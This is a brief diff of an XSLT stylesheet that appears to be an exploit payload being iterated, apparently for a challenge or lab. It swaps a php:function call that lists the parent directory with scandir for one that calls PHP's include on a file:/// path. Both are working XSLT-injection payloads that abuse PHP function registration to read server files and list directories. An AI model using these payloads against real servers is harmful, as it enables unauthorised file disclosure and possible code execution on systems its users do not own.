@@ -3,9 +3,7 @@
 
 
    
-   <xsl:value-of select="php:function('print_r', function(){
-    return scandir('..');
-})"/>
+   <xsl:value-of select="php:function('include','file:///' )"/>
    
    </xsl:template>
 </xsl:stylesheet>
